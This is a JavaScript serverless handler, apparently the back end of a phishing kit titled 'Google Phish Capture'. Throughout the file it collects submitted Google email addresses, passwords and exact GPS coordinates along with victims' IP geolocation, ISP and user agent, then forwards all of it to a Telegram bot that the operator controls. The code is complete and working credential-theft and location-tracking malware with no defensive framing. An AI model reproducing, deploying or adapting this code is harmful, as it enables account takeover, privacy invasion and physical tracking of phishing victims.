export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'method not allowed' });

  const TG_TOKEN = process.env.TG_TOKEN;
  const TG_CHAT  = process.env.TG_CHAT;

  const b = req.body || {};
  const ip = ((req.headers['x-forwarded-for'] || '').split(',')[0] || '').trim() || req.headers['x-real-ip'] || '?';
  const ua = req.headers['user-agent'] || '?';
  const now = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

  let geo = {};
  try {
    if (ip && ip !== '?' && !ip.startsWith('127.') && !ip.startsWith('192.168') && !ip.startsWith('10.')) {
      const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,as,query`);
      geo = await r.json();
    } else {
      geo = { country: 'Local', city: 'Local', isp: 'Local' };
    }
  } catch (e) { geo = { error: 'geo fail' }; }

  const esc = (s) => s === undefined || s === null ? '-' : String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

  let msg = '';
  const header = `🔐 <b>Google Phish Capture</b>\n🕐 ${now}\n\n`;

  if (b.type === 'email') {
    msg = header +
      `📧 <b>EMAIL SUBMIT</b>\n` +
      `<b>Email:</b> <code>${esc(b.value)}</code>\n\n` +
      `🌐 <b>IP:</b> <code>${esc(ip)}</code>\n` +
      `📍 <b>Lokasi:</b> ${esc(geo.city)}, ${esc(geo.regionName)}, ${esc(geo.country)}\n` +
      `🏢 <b>ISP:</b> ${esc(geo.isp)}\n` +
      `🧭 <b>ASN:</b> ${esc(geo.as)}\n` +
      (geo.lat && geo.lon ? `🗺️ <a href="https://www.google.com/maps?q=${geo.lat},${geo.lon}">Buka di Maps</a>\n` : '') +
      `💻 <b>UA:</b> <code>${esc(String(ua).slice(0, 100))}</code>`;
  }
  else if (b.type === 'password') {
    msg = header +
      `🔑 <b>PASSWORD SUBMIT</b>\n` +
      `<b>Email:</b> <code>${esc(b.email)}</code>\n` +
      `<b>Password:</b> <code>${esc(b.password)}</code>\n\n` +
      `🌐 <b>IP:</b> <code>${esc(ip)}</code>\n` +
      `📍 <b>Lokasi:</b> ${esc(geo.city)}, ${esc(geo.regionName)}, ${esc(geo.country)}\n` +
      `🏢 <b>ISP:</b> ${esc(geo.isp)}\n` +
      (geo.lat && geo.lon ? `🗺️ <a href="https://www.google.com/maps?q=${geo.lat},${geo.lon}">Buka di Maps</a>\n` : '');
  }
  else if (b.type === 'gps') {
    msg = header +
      `📍 <b>GPS EXACT</b>\n` +
      `<b>Email:</b> <code>${esc(b.email)}</code>\n` +
      `<b>Lat:</b> <code>${esc(b.lat)}</code>\n` +
      `<b>Lng:</b> <code>${esc(b.lng)}</code>\n` +
      `<b>Akurasi:</b> ${esc(b.accuracy)} meter\n\n` +
      `🗺️ <a href="https://www.google.com/maps?q=${b.lat},${b.lng}">Buka di Google Maps</a>`;
  }
  else { msg = header + `<pre>${esc(JSON.stringify(b, null, 2))}</pre>`; }

  if (TG_TOKEN && TG_CHAT) {
    try {
      await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TG_CHAT, text: msg, parse_mode: 'HTML' })
      });
    } catch (e) { console.log('[TG ERR]', e.message); }
  }

  console.log(`[+] ${b.type} | ${b.value || b.email || ''} | ${ip}`);
  res.status(200).json({ ok: true });
}
